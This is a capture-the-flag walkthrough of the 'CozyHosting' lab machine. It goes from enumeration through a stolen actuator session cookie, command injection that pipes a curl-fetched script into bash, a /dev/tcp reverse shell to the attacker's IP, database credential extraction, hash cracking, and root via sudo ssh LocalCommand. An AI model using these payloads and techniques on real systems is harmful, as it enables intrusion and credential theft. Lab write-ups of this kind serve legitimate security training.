
Starting with nmap 

```
nmap -sC -sV {target ip}
```

We see that ports 22 and 80 are open.

When navigating to the ip in the web-browser we get the domain `cozyhosting.htb`, and we can add the domain to the hosts file.

```
echo "10.10.11.230  cozyhosting.htb" | sudo tee -a /etc/hosts
```

Using ffuf we enumerate the directories,

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-
medium.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
```

We find a few useful directories including `login`. Upon accessing the `/login` page, we cannot gain access to the app, but we are able to find that this is a Java Spring Boot application.

We run the ffuf scan again with a Spring Boot wordlist:

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FFUZ
-u http://cozyhosting.htb/FFUZ -ic -t 100
```
We find `actuator/mappings` is exposed, we can visit that web address and we find the `actuator/sessions` endpoint is revealing user data. When we visit `/actuator/sessions` the user `kanderson` has a cookie revealed. 

We can use the cookie we found when visiting the `/admin` directory with the developer's console in the `storage` tab. This gets us access to the web application.

We spin up a local server 

```
python -m http.server 7000
```

And we attempt to ping the server by entering the following into the input Hostname/Username, `127.0.0.1/test;curl${IFS}http://10.10.14.49:7000;`

We receive a GET request on the local web server. So we spin up a netcat listener, and create a reverse shell locally.

```
nc -lnvp
```
```
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh
```

We change the payload to connect to our local netcat listener, while keeping the hostname `127.0.0.1`:

```
test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;
```

Upon sending the request in the webapp, we get a shell on our netcat listener.

Our shell lands in the `/app` directory where we unzip the `cloudhosting-0.0.1.jar` file.

We unzip the file:

```
unzip -d /tmp/app cloudhosting-0.0.1.jar
```
There are database credentials in the file:

```
cat /tmp/app/BOOT-INF/classes/application.properties
```

`postgres:Vg&nvzAQ7XxR`

We connect to postgres and the database

```
$psql -h 127.0.0.1 -U postgres
$\connect cozyhosting
$select * from users;
```

From the admin user we get the hash:

```
hashid $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm

Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
```

```
hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
```
We get the username:password `josh:ManchesterUnited`

We login to josh with `ssh`, and josh's flag is `/home/josh/user.txt`

Running `sudo -l` we find the file `usr/bin/ssh` can be run as root.

We run: 
```
sudo /usr/bin/ssh -v -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash'
josh@127.0.0.1
```

Which gives us root access, the flag can then be found at `/root/root.txt`


